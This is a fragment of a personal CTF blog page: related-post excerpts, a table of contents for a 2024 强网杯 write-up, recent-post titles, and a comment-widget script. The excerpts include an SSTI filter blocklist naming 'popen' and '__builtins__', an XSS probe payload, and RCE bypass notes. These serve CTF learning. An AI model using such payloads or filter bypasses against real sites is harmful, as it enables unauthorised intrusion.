智能转发数据，避免广播 无智能，仅放大信号   ARPAddress Resolution...</div></div></div></a><a class="pagination-related" href="/2024/12/03/wucup/" title="2024WuCup-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-03</div><div class="info-item-2">2024WuCup-wp</div></div><div class="info-2"><div class="info-item-1">wucup-DDLmisc太极   1234567891011tai ji sheng liang yiliang yi sheng si xiangsi xiang sheng ba guaba gua ding ji xiongji xiong sheng da yetieny   12341---太极亦是轮回lieig     123 2(1212 -4) 5   ----周而复始sieau      1232 2(12312)jieay        12321(12121)   元神WuCup{0e49b776-b732-4242-b91c-8c513a1f12ce}  WuCup{7c16e21c-31c2-439e-a814-bba2ca54101a} 把docx文件换成zip文件  模糊的这个东西，减淡加弱化 WuCup{6bb9d97d-7169-434b-a7cf-0ee0b6fdfa30}      ...</div></div></div></a><a class="pagination-related" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8ACN-fnst-CTF/" title="第二届CN-fnst::CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-17</div><div class="info-item-2">第二届CN-fnst::CTF</div></div><div class="info-2"><div class="info-item-1">CN-fnst::CTFweb1ez_python盲猜是文件包含file题目是python，读取源码；看到shell路由有个ssti  再看看waf &#x2F;?file&#x3D;&#x2F;app&#x2F;waf.py 123456def waf_check(value):    dangerous_patterns = [&#x27;os&#x27;, &#x27;set&#x27;, &#x27;__builtins__&#x27;, &#x27;=&#x27;, &#x27;.&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;&#125;&#125;&#x27;, &#x27;popen&#x27;, &#x27;+&#x27;, &#x27;__&#x27;]    for pattern in dangerous_patterns:        if pattern in value:            return False    return...</div></div></div></a><a class="pagination-related" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF-%E9%93%81%E4%B8%89/" title="第二届长城杯&#x2F;铁三"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-17</div><div class="info-item-2">第二届长城杯&#x2F;铁三</div></div><div class="info-2"><div class="info-item-1">第二届国赛webSafe_Proxy源码题目 1from flask import Flask, request, render_template_stringimport socketimport threadingimport htmlapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=&quot;GET&quot;])def source():    with open(__file__, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:        return&#x27;&lt;pre&gt;&#x27;+html.escape(f.read())+&#x27;&lt;/pre&gt;&#x27;@app.route(&#x27;/&#x27;, methods=[&quot;POST&quot;])def template():    template_code = request.form.get(&quot;code&quot;)    # 安全过滤   ...</div></div></div></a><a class="pagination-related" href="/2024/12/08/2024polar-winter/" title="2024polar-winter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-08</div><div class="info-item-2">2024polar-winter</div></div><div class="info-2"><div class="info-item-1">2024polarctf-web冬季个人挑战赛【WEB】xxmmll这个是先bp发个包，响应的有个php文件，进去之后有个输入框 1  【WEB】赌王 –没做出来直接发空爆破 你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件  进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20  存在xss漏洞但是没东西 数字unicode绕过+科学计数法+全字符绕过   不好使，好像是没被解析 复现123&lt;script&gt;confirm(1);&lt;/script&gt;按提示去xss;提示如下↓就c你o还n想f弹i窗r,m  给出另一个文件php,然后网页源代码有提示，伪造本地IP；然后去命令执行  【WEB】狗黑子的RCEps看进程，里面没事，env看环境变量，有个假flag   打开文件使用函数替换 rev strings  查看目录文件使用函数替换 find &#x2F;       **find**列出目录及其子目录中的文件。 出flag.php   du &#x2F;       ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#24%E5%BC%BA%E7%BD%91"><span class="toc-number">1.</span> <span class="toc-text">24强网</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PyBlockly"><span class="toc-number">1.1.</span> <span class="toc-text">PyBlockly</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">题目源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.1.3.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.1.4.</span> <span class="toc-text">法二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%89"><span class="toc-number">1.1.5.</span> <span class="toc-text">法三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E5%9B%9B"><span class="toc-number">1.1.6.</span> <span class="toc-text">法四</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xiaohuanxiong"><span class="toc-number">1.2.</span> <span class="toc-text">xiaohuanxiong</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">法二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%89-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">法三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle-jail"><span class="toc-number">1.3.</span> <span class="toc-text">pickle_jail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Proxy"><span class="toc-number">1.4.</span> <span class="toc-text">Proxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#snake"><span class="toc-number">1.5.</span> <span class="toc-text">snake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#platform"><span class="toc-number">1.6.</span> <span class="toc-text">platform</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Game"><span class="toc-number">1.7.</span> <span class="toc-text">Password Game</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-2"><span class="toc-number">1.7.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-2"><span class="toc-number">1.7.2.</span> <span class="toc-text">法二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/27/2025TGctf/" title="2025TGctf">2025TGctf</a><time datetime="2025-04-27T08:36:37.000Z" title="Created 2025-04-27 16:36:37">2025-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/27/%E5%85%8D%E6%9D%80%E8%BF%87%E7%81%AB%E7%BB%92%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/" title="免杀过火绒思路整理">免杀过火绒思路整理</a><time datetime="2025-04-27T08:28:12.000Z" title="Created 2025-04-27 16:28:12">2025-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/THM-Ra2/" title="THM-Ra2">THM-Ra2</a><time datetime="2025-04-03T10:32:00.000Z" title="Created 2025-04-03 18:32:00">2025-04-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/THM%E7%AC%94%E8%AE%B0/" title="THM笔记">THM笔记</a><time datetime="2025-03-17T11:15:33.000Z" title="Created 2025-03-17 19:15:33">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/2024%E9%B9%8F%E7%A8%8B%E6%9D%AF/" title="2024鹏程杯">2024鹏程杯</a><time datetime="2025-03-17T11:12:08.000Z" title="Created 2025-03-17 19:12:08">2025-03-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const initValine = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      visitor: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>